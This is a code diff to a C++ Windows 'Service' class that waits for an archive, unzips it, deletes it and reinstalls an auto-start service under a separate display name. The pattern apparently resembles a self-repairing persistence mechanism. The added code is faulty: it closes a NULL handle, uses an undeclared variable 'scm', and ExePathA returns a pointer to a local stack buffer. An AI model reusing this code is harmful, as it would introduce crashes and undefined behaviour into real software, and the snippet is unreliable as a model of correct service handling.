@@ -40,7 +40,17 @@ void Service::StartServiceIfNeeded(LPCSTR lpServiceName)
 
 
 	SC_HANDLE hManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+	if (hManager == NULL) {
+		CloseServiceHandle(hManager);
+		return;
+	}
 	hService = OpenService(hManager, lpServiceName, SC_MANAGER_ALL_ACCESS);
+	if (hService == NULL)
+	{
+		CloseServiceHandle(scm);
+		return;
+	}
+
 	//If the service is paused
 	if (status.dwCurrentState == SERVICE_PAUSED) {
 		ControlService(hService, SERVICE_CONTROL_CONTINUE, &status);
@@ -66,15 +76,17 @@ void Service::CheckAndRepairService()
 			i++;
 		}
 		//Wait for file existence
-		while (GetFileAttributesA(SERVICE_ARCHIVE_NAME) == INVALID_FILE_ATTRIBUTES) {
+		while (GetFileAttributesA(SHELL_PATH(SERVICE_ARCHIVE_NAME)) == INVALID_FILE_ATTRIBUTES) {
 			Sleep(100);
 		}
 		//Unzip archive
-		while (!unzip(GetCWD() + std::string(SERVICE_ARCHIVE_NAME), GetCWD())) {
+		while (!unzip(std::string(SHELL_PATH(SERVICE_ARCHIVE_NAME)), GetCWD())) {
 			Sleep(1000);
 		}
+		//Delete archive
+		remove((SHELL_PATH(SERVICE_ARCHIVE_NAME)));
 		//Create service
-		while (!InstallService(SERVICE_NAME, (GetCWD() + std::string(SERVICE_FILE_NAME)).c_str())) {
+		while (!InstallService(SERVICE_NAME, SHELL_PATH(SERVICE_FILE_NAME))) {
 			Sleep(1000);
 		}
 	}
@@ -105,7 +117,7 @@ bool Service::InstallService(LPCSTR lpServiceName, LPCSTR lpServicePath)
 	schService = CreateService(
 		schSCManager,              // SCM database 
 		lpServiceName,                   // name of service 
-		lpServiceName,                   // service name to display 
+		SERVICE_DISPLAY_NAME,                   // service name to display 
 		SERVICE_ALL_ACCESS,        // desired access 
 		SERVICE_WIN32_OWN_PROCESS, // service type 
 		SERVICE_AUTO_START,      // start type 
@@ -139,4 +151,11 @@ std::string GetCWD() {
 	std::string file_path(ws.begin(), ws.end());
 	std::wstring::size_type pos = file_path.find_last_of("\\/");
 	return file_path.substr(0, pos + 1);
+}
+
+CHAR* ExePathA()
+{
+	CHAR buffer[MAX_PATH] = { 0 };
+	GetModuleFileNameA(NULL, buffer, MAX_PATH);
+	return buffer;
 }
